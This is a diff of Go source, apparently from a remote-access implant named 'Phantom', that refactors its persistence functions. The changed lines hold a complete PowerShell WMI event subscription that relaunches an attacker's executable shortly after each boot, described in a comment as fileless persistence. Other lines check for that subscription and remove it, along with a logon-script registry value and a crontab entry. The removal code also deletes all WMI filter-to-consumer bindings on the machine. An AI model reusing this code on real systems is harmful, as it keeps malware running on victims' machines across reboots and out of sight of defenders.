@@ -172,7 +172,7 @@ func persistStartupFolder(exe string) ([]byte, error) {
 func persistWMIEvent(exe string) ([]byte, error) {
 	// WMI event subscription — fileless persistence
 	ps := fmt.Sprintf(`$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{Name="PhantomFilter";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"};$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{Name="PhantomConsumer";CommandLineTemplate="%s"};Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{Filter=$Filter;Consumer=$Consumer}`, exe)
-	output, err := ExecuteShell([]string{fmt.Sprintf(`powershell -ep bypass -c "%s"`, ps)})
+	output, err := RunPowerShell(ps)
 	if err != nil {
 		return nil, err
 	}
@@ -297,7 +297,7 @@ func listPersistence() ([]byte, error) {
 		}
 
 		// Check WMI
-		out, _ = ExecuteShell([]string{`powershell -c "Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where Name -eq 'PhantomFilter' | Select Name"`})
+		out, _ = RunPowerShell(`Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'PhantomFilter' } | Select-Object Name`)
 		if len(out) > 10 {
 			results = append(results, "[✓] WMI Event Subscription: PhantomFilter")
 		}
@@ -350,7 +350,7 @@ func removePersistence() ([]byte, error) {
 		ExecuteShell([]string{`reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f 2>nul`})
 		results = append(results, "[*] Logon script removed")
 
-		ExecuteShell([]string{`powershell -c "Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where Name -eq 'PhantomFilter' | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where Name -eq 'PhantomConsumer' | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject" 2>nul`})
+		RunPowerShell(`Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'PhantomFilter' } | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'PhantomConsumer' } | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject`)
 		results = append(results, "[*] WMI event subscription removed")
 	} else {
 		ExecuteShell([]string{"crontab -l 2>/dev/null | grep -v phantom | crontab -"})
